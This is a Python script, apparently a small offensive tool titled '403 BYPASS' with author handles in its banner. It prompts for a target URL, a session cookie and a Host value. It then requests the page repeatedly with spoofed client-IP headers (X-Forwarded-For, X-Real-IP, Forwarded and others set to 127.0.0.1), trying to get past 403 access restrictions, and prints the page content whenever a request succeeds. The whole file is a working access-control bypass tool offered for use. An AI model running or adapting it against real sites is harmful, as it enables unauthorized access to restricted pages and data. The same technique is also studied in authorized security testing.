import requests
import random

def display_banner():
    banner = """


██╗  ██╗ ██████╗ ██████╗     ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
██║  ██║██╔═████╗╚════██╗    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
███████║██║██╔██║ █████╔╝    ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
╚════██║████╔╝██║ ╚═══██╗    ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
     ██║╚██████╔╝██████╔╝    ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
     ╚═╝ ╚═════╝ ╚═════╝     ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                                                                              


    \033[92mAuth0r: discord : theaaziz | github : icycodesec\033[0m
    """
    print(banner)

def test_bypass(url, session_id, host):
    headers_list = [
        {"Host": host, "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
        {"Host": host, "X-Forwarded-For": "127.0.0.1"},
        {"Host": host, "Origin": f"https://{host}"},
        {"Host": host, "X-Originating-IP": "127.0.0.1"},
        {"Host": host, "Forwarded": "for=127.0.0.1;proto=http;by=127.0.0.1"},
        {"Host": host, "Client-IP": "127.0.0.1"}
    ]

    cookies = {"PHPSESSID": session_id}

    for i, headers in enumerate(headers_list, 1):
        try:
            print(f"[Attempt {i}] Trying with headers: {headers}")
            response = requests.get(url, headers=headers, cookies=cookies, allow_redirects=False)
            print(f"[Attempt {i}] Status Code: {response.status_code}")

            if response.status_code == 200:
                print(f"[Success] Bypass achieved on attempt {i}!")
                print(f"\nResponse Content:\n{response.text}")
                continue
        except requests.RequestException as e:
            print(f"[Error] An exception occurred: {e}")

    print("[Result] All attempts completed.")

if __name__ == "__main__":
    display_banner()
    target_url = input("Enter the target URL: ").strip()
    session_id = input("Enter the PHPSESSID: ").strip()
    host = input("Enter the Host: ").strip()

    test_bypass(target_url, session_id, host)
